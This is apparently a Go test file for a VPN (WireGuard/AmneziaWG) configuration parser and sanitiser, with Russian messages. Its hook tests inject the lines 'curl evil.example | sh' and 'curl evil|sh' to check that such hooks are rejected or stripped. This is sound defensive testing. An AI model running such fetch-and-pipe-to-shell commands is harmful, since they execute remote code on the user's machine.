package conf

import (
	"encoding/base64"
	"strings"
	"testing"
)

var key = base64.StdEncoding.EncodeToString(make([]byte, 32))

func valid() string {
	return `# comment
[Interface]
PrivateKey = ` + key + `
Address = 10.8.0.2/32, fd00::2/128
DNS = 1.1.1.1, example.org
MTU = 1380
Jc = 5
Jmin = 10
Jmax = 50
S1 = 30
S2 = 40
H1 = 100-200
H2 = 300
I1 = <b 0xdeadbeef><r 16>

[Peer]
PublicKey = ` + key + `
PresharedKey = ` + key + `
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = vpn.example.org:51820
PersistentKeepalive = 25
`
}

func TestParseValid(t *testing.T) {
	cfg, err := Parse(valid())
	if err != nil {
		t.Fatalf("валидный конфиг отвергнут: %v", err)
	}
	s := cfg.Summary()
	if s.Peers != 1 || len(s.Endpoints) != 1 || s.Endpoints[0] != "vpn.example.org:51820" {
		t.Fatalf("неверная сводка: %+v", s)
	}
	if len(s.Addresses) != 2 || !s.Obfuscation || !s.HasPSK {
		t.Fatalf("неверная сводка: %+v", s)
	}
}

func TestParseCRLFAndComments(t *testing.T) {
	text := strings.ReplaceAll(valid(), "\n", "\r\n")
	if _, err := Parse(text); err != nil {
		t.Fatalf("CRLF: %v", err)
	}
}

func TestParseRejectsHooks(t *testing.T) {
	for _, h := range []string{"PostUp", "PreUp", "PostDown", "PreDown", "postup"} {
		text := strings.Replace(valid(), "MTU = 1380", h+" = curl evil.example | sh", 1)
		_, err := Parse(text)
		if err == nil || !strings.Contains(err.Error(), "хуки") {
			t.Fatalf("хук %s должен отвергаться, err=%v", h, err)
		}
	}
}

func TestParseRejectsBad(t *testing.T) {
	cases := map[string]func(string) string{
		"неизвестный ключ":    func(s string) string { return strings.Replace(s, "MTU = 1380", "Evil = 1", 1) },
		"короткий ключ":       func(s string) string { return strings.Replace(s, key, "AAAA", 1) },
		"порт 0":              func(s string) string { return strings.Replace(s, ":51820", ":0", 1) },
		"порт 70000":          func(s string) string { return strings.Replace(s, ":51820", ":70000", 1) },
		"endpoint без порта":  func(s string) string { return strings.Replace(s, "vpn.example.org:51820", "vpn.example.org", 1) },
		"хост с пробелом":     func(s string) string { return strings.Replace(s, "vpn.example.org", "vpn example", 1) },
		"плохой CIDR":         func(s string) string { return strings.Replace(s, "10.8.0.2/32", "10.8.0.2/99", 1) },
		"MTU мал":             func(s string) string { return strings.Replace(s, "1380", "100", 1) },
		"повтор MTU":          func(s string) string { return strings.Replace(s, "MTU = 1380", "MTU = 1380\nMTU = 1400", 1) },
		"I1 с управл. симв.":  func(s string) string { return strings.Replace(s, "<b 0xdeadbeef><r 16>", "a\x01b", 1) },
		"неизвестная секция":  func(s string) string { return s + "\n[Evil]\nA = b\n" },
		"второй Interface":    func(s string) string { return s + "\n[Interface]\nPrivateKey = " + key + "\n" },
		"нет пиров":           func(s string) string { return s[:strings.Index(s, "[Peer]")] },
		"нет Address":         func(s string) string { return strings.Replace(s, "Address = 10.8.0.2/32, fd00::2/128\n", "", 1) },
		"параметр вне секции": func(s string) string { return "PrivateKey = " + key + "\n" + s },
		"нулевой байт":        func(s string) string { return s + "\x00" },
		"слишком большой":     func(s string) string { return s + strings.Repeat("#", MaxSize) },
	}
	for name, mut := range cases {
		if _, err := Parse(mut(valid())); err == nil {
			t.Errorf("%s: ожидалась ошибка", name)
		}
	}
}

func TestRenderOnlyGeneratedHooks(t *testing.T) {
	cfg, err := Parse(valid())
	if err != nil {
		t.Fatal(err)
	}
	out := cfg.Render(Hooks{PostUp: []string{"echo up %i"}, PostDown: []string{"echo down %i"}})
	if strings.Count(out, "PostUp") != 1 || strings.Count(out, "PostDown") != 1 {
		t.Fatalf("в выводе должны быть ровно сгенерированные хуки:\n%s", out)
	}
	// результат должен снова разбираться только если убрать хуки: их Parse отвергает
	if _, err := Parse(out); err == nil {
		t.Fatal("Parse обязан отвергать конфиг со сгенерированными хуками (они не пользовательские)")
	}
	plain := cfg.Render(Hooks{})
	if _, err := Parse(plain); err != nil {
		t.Fatalf("повторный разбор без хуков: %v", err)
	}
}

// panelConf повторяет формат, который выдаёт панель amneziawg31-installer
// (src/awg31ctl: client_config + awg_lines), вместе со строками «Шлюз для
// локальной сети» из её шаблонов.
func panelConf() string {
	return `[Interface]
PrivateKey = ` + key + `
Address = 10.77.10.2/32
DNS = 1.1.1.1
MTU = 1280
Jc = 6
Jmin = 51
Jmax = 142
S1 = 33
S2 = 71
S3 = 20
S4 = 9
H1 = 1234567
H2 = 7654321
H3 = 222222
H4 = 333333
HeaderProtectionKey = ` + key + `
ContentPaddingAddition = 16-72
RandomTrailers = on
DisableCookies = on
RekeyAfterTime = 120-180
MaxHandshakeAttempts = 5
I1 = <b 0xc0000000010800000000><r 40>

Table = 200
PostUp = iptables -t nat -A POSTROUTING -o %i -j MASQUERADE
PostUp = ip rule add iif eth0 lookup 200
PostDown = iptables -t nat -D POSTROUTING -o %i -j MASQUERADE

[Peer]
PublicKey = ` + key + `
PresharedKey = ` + key + `
Endpoint = 203.0.113.10:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
`
}

func TestPanelConfigWithoutHooksIsAccepted(t *testing.T) {
	clean, notes := Sanitize(panelConf())
	if len(notes) != 2 {
		t.Fatalf("ожидались замечания про хуки и Table, получено %v", notes)
	}
	if strings.Contains(clean, "PostUp") || strings.Contains(clean, "PostDown") || strings.Contains(clean, "Table") {
		t.Fatalf("после очистки остались хуки или Table:\n%s", clean)
	}
	if _, err := Parse(clean); err != nil {
		t.Fatalf("очищенный конфиг панели отвергнут: %v", err)
	}
	// Сам конфиг с хуками по-прежнему отвергается — очистка только для подписок.
	if _, err := Parse(panelConf()); err == nil {
		t.Fatal("Parse обязан отвергать хуки")
	}
}

func TestSanitizeKeepsPlainConfigUntouched(t *testing.T) {
	clean, notes := Sanitize(valid())
	if notes != nil || clean != valid() {
		t.Fatalf("конфиг без хуков не должен меняться: %v", notes)
	}
}

func TestSanitizeKeepsTableAutoAndOff(t *testing.T) {
	for _, tbl := range []string{"off", "auto"} {
		text := strings.Replace(valid(), "MTU = 1380", "MTU = 1380\nTable = "+tbl+"\nPostUp = echo x", 1)
		clean, notes := Sanitize(text)
		if len(notes) != 1 || !strings.Contains(clean, "Table = "+tbl) {
			t.Fatalf("Table = %s должен остаться: %v\n%s", tbl, notes, clean)
		}
	}
}

func TestSanitizeIsCaseAndSpaceInsensitiveForHooks(t *testing.T) {
	text := strings.Replace(valid(), "MTU = 1380", "MTU = 1380\n  postup=curl evil|sh\nPOSTDOWN = x\n\tPreUp =y", 1)
	clean, _ := Sanitize(text)
	if _, err := Parse(clean); err != nil {
		t.Fatalf("после очистки конфиг должен проходить Parse: %v", err)
	}
	low := strings.ToLower(clean)
	if strings.Contains(low, "postup") || strings.Contains(low, "postdown") || strings.Contains(low, "preup") {
		t.Fatalf("хук пережил очистку:\n%s", clean)
	}
}

func TestV31KeyValidation(t *testing.T) {
	base := valid()
	cases := []struct {
		line string
		ok   bool
	}{
		{"HeaderProtectionKey = " + key, true},
		{"HeaderProtectionKey = AAAA", false},
		{"ContentPaddingAddition = 0-16", true},
		{"ContentPaddingAddition = 20-10", false},
		{"ContentPaddingAddition = 70000", false},
		{"RekeyTimeout = 5", true},
		{"RandomTrailers = on", true},
		{"DisableCookies = OFF", true},
		{"RandomTrailers = maybe", false},
		{"J1 = abc", false},  // ключа нет в 3.1: утилита отвергла бы его при подъёме
		{"Itime = 5", false}, // то же
	}
	for _, c := range cases {
		_, err := Parse(strings.Replace(base, "MTU = 1380", "MTU = 1380\n"+c.line, 1))
		if (err == nil) != c.ok {
			t.Errorf("%q: ok=%v, err=%v", c.line, c.ok, err)
		}
	}
	peer := strings.Replace(base, "PersistentKeepalive = 25", "PersistentKeepalive = 25\nAdvancedSecurity = on", 1)
	if _, err := Parse(peer); err != nil {
		t.Errorf("AdvancedSecurity в [Peer] должен приниматься: %v", err)
	}
}

func TestIsServer(t *testing.T) {
	k := base64.StdEncoding.EncodeToString(make([]byte, 32))
	server := "[Interface]\nPrivateKey = " + k + "\nAddress = 10.8.0.1/24\nListenPort = 51820\n\n[Peer]\nPublicKey = " + k + "\nAllowedIPs = 10.8.0.2/32\n"
	client := server + "\n[Peer]\nPublicKey = " + k + "\nAllowedIPs = 0.0.0.0/0\nEndpoint = 192.0.2.1:51820\n"
	noPort := strings.Replace(server, "ListenPort = 51820\n", "", 1)
	for text, want := range map[string]bool{server: true, client: false, noPort: false} {
		c, err := Parse(text)
		if err != nil {
			t.Fatal(err)
		}
		if c.IsServer() != want {
			t.Errorf("IsServer=%v, ожидалось %v:\n%s", c.IsServer(), want, text)
		}
	}
}
